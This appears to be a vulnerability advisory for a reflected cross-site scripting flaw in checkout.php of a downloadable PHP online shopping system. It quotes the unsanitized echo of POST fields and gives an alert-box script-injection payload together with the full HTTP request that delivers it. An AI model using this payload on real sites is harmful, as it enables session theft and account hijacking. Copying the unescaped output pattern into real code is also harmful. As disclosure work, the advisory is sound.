## ONLINE SHOPPING SYSTEM checkout.php Reflected XSS Vulnerability

### I. Vulnerability Impact

An attacker can craft a malicious request that injects arbitrary JavaScript code into the page, which executes in the victim's browser. This can lead to session cookie theft, account hijacking, phishing attacks, and redirection to malicious sites.

### II. Source Code Analysis

The vulnerability resides in `checkout.php`, lines 244-260:

```php
while($i<=$total_count){
    $item_name_ = $_POST['item_name_'.$i];
    $item_number_ = $_POST['item_number_'.$i];
    $amount_ = $_POST['amount_'.$i];
    $quantity_ = $_POST['quantity_'.$i];
    ...
    echo "<tr><td><p>$item_number_</p></td><td><p>$item_name_</p></td><td><p>$quantity_</p></td><td><p>$amount_</p></td></tr>";
    ...
}
```

The `$amount_` variable is taken directly from `$_POST['amount_1']` and output into the HTML body inside a `<p>` tag without any sanitization. An attacker can inject HTML tags including `<script>` through the `amount_1` parameter, and the browser will parse and execute the injected script.

### III. Payload

The core injection payload is:

```
'><sCrIpT>alert(999)</sCrIpT>
```

After injection, the output HTML becomes:

```html
<td><p>'><sCrIpT>alert(999)</sCrIpT></p></td>
```

The browser parses `<sCrIpT>alert(999)</sCrIpT>` as a script element and executes the JavaScript, triggering the alert popup.

HTTP request:

```
POST /checkout.php HTTP/1.1
Host: onlineshop
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=ol422um54c9e387qhla8o63ril

cmd=_cart&...&amount_1='><sCrIpT>alert(999)</sCrIpT>&...&login_user_with_product=Ready+to+Checkout
```

### IV. Source Download

https://code-projects.org/online-shopping-system-in-php-with-source-code/

![image-20260627111256089](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260627111256089.png)